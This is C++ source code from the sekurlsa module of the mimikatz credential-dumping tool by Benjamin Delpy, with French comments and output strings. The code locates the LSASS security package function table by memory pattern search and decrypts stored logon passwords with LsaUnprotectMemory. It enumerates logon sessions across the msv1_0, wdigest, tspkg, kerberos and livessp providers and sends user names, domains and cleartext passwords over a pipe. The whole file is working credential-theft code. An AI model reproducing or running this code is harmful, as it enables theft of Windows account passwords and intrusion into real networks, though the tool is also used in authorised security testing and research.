/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "sekurlsa.h"

PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable = NULL;
PRTL_LOOKUP_ELEMENT_GENERIC_TABLE_AV RtlLookupElementGenericTableAvl = reinterpret_cast<PRTL_LOOKUP_ELEMENT_GENERIC_TABLE_AV>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlLookupElementGenericTableAvl"));

vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;

__kextdll bool __cdecl getDescription(wstring * maDescription)
{
	bool resultat = false;
	maDescription->assign(L"SekurLSA : librairie de manipulation des données de sécurités dans LSASS");
	
	if(resultat = mod_system::getVersion(&mod_system::GLOB_Version)) /* Utilisation en tant qu'initialisateur */
	{
		if(GetModuleHandle(L"msv1_0")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getMSVLogonData, wstring(L"msv1_0")));
		if(GetModuleHandle(L"wdigest")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getWDigestLogonData, wstring(L"wdigest")));
		if(GetModuleHandle(L"tspkg")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getTsPkgLogonData, wstring(L"tspkg")));
		if(GetModuleHandle(L"kerberos")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getKerberosLogonData, wstring(L"kerberos")));
		if((mod_system::GLOB_Version.dwBuildNumber >= 8000) && GetModuleHandle(L"livessp")) GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getLiveSSPLogonData, wstring(L"livessp")));
	}
	return resultat;
}

bool searchLSAFuncs()
{
	if(!SeckPkgFunctionTable)
	{
		if(HMODULE hLsasrv = GetModuleHandle(L"lsasrv"))
		{
			struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsasrv, "LsaIRegisterNotification"), GetProcAddress(hLsasrv, "LsaICancelNotification")};
			if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
				mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&SeckPkgFunctionTable), L"lsasrv", reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
		}
	}
	return (SeckPkgFunctionTable != NULL);
}

wstring getPasswordFromProtectedUnicodeString(LSA_UNICODE_STRING * ptrPass)
{
	wstring password;
	if(ptrPass->Buffer && (ptrPass->Length > 0))
	{
		BYTE * monPass = new BYTE[ptrPass->MaximumLength];
		RtlCopyMemory(monPass, ptrPass->Buffer, ptrPass->MaximumLength);
		SeckPkgFunctionTable->LsaUnprotectMemory(monPass, ptrPass->MaximumLength);
		password.assign(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monPass), ptrPass->Length));
		delete[] monPass;
	}
	return password;
}

void genericCredsToStream(wostringstream * monStream, PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg)
{
	if(mesCreds)
	{
		wstring password = getPasswordFromProtectedUnicodeString(&mesCreds->Password);
		if(justSecurity)
			*monStream << password;
		else
		{
			wstring userName(mesCreds->UserName.Buffer, mesCreds->UserName.Length / sizeof(wchar_t));
			wstring domainName(mesCreds->Domaine.Buffer, mesCreds->Domaine.Length / sizeof(wchar_t));
			*monStream <<  endl <<
					L"\t * Utilisateur  : " << (isTsPkg ? domainName : userName) << endl <<
					L"\t * Domaine      : " << (isTsPkg ? userName : domainName) << endl <<
					L"\t * Mot de passe : " << password;
		}
	} else *monStream << L"n.t. (LUID KO)";
}

__kextdll bool __cdecl getLogonPasswords(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	return getLogonData(monPipe, mesArguments, &GLOB_ALL_Providers);
}

PLIST_ENTRY getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
{
	PLIST_ENTRY resultat = NULL;
	for(PLIST_ENTRY pStruct = pSecurityStruct->Flink ; pStruct != pSecurityStruct ; pStruct = pStruct->Flink)
	{
		if(RtlEqualLuid(luidToFind, reinterpret_cast<PLUID>(reinterpret_cast<PBYTE>(pStruct) + LUIDoffset)))
		{
			resultat = pStruct;
			break;
		}
	}
	return resultat;
}

bool getLogonData(mod_pipe * monPipe, vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders)
{
	bool sendOk = true;
	PLUID sessions;
	ULONG count;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&count, &sessions)))
	{
		for (ULONG i = 0; i < count && sendOk; i++)
		{
			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if(NT_SUCCESS(LsaGetLogonSessionData(&sessions[i], &sessionData)))
			{
				if(sessionData->LogonType != Network)
				{
					wstring username(sessionData->UserName.Buffer, sessionData->UserName.Length / sizeof(wchar_t));
					wstring package(sessionData->AuthenticationPackage.Buffer, sessionData->AuthenticationPackage.Length / sizeof(wchar_t));
					wstring domain(sessionData->LogonDomain.Buffer, sessionData->LogonDomain.Length / sizeof(wchar_t));
				
					wostringstream maPremiereReponse;
					maPremiereReponse << endl <<
						L"Authentification Id         : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
						L"Package d\'authentification  : " << package << endl <<
						L"Utilisateur principal       : " << username << endl <<
						L"Domaine d\'authentification  : " << domain << endl;

					sendOk = sendTo(monPipe, maPremiereReponse.str());

					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
					{
						wostringstream maSecondeReponse;
						maSecondeReponse << L'\t' << monProvider->second << L" : \t";
						sendOk = sendTo(monPipe, maSecondeReponse.str());
						monProvider->first(&sessions[i], monPipe, mesArguments->empty());
						sendOk = sendTo(monPipe, L"\n");
					}
				}
				LsaFreeReturnBuffer(sessionData);
			}
			else sendOk = sendTo(monPipe, L"Erreur : Impossible d\'obtenir les données de session\n");
		}
		LsaFreeReturnBuffer(sessions);
	}
	else sendOk = sendTo(monPipe, L"Erreur : Impossible d\'énumerer les sessions courantes\n");

	return sendOk;
}
